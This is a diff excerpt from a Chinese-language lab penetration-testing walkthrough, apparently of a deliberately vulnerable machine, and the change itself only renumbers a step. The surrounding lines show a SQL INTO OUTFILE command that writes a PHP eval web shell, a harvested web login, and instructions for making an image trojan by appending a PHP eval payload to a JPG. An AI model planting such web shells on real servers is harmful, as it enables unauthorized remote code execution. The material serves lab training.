@@ -512,7 +512,8 @@ select '<?php @eval($_POST[cmd]);?>'INTO OUTFILE '/var/www/back.php'
 ```
 没有权限，此路不通，所以只能将收集到的Web口令去尝试其他站点位置
 ## 6.利用panel.php页面文件包含漏洞
-使用在phpmyadmin中获取到的web口令biLLu：hEx_it登入，跳转到panel.php
+1. 使用在phpmyadmin中获取到的web口令biLLu：hEx_it登入，跳转到panel.php
+2. 
 ###6.1 制作一个图片马
 我们可以准备一个内容为`<?php @eval($_POST['hello']); ?> `的txt文档(name.txt)和一张不要太大的图片(可以是png/jpg/bng什么的，就叫1.jpg好了)
 然后在CMD下使用`copy 1.jpg/b + name.txt/a 2.jpg `命令就可以轻松地得到一个名为2.jpg的图片马
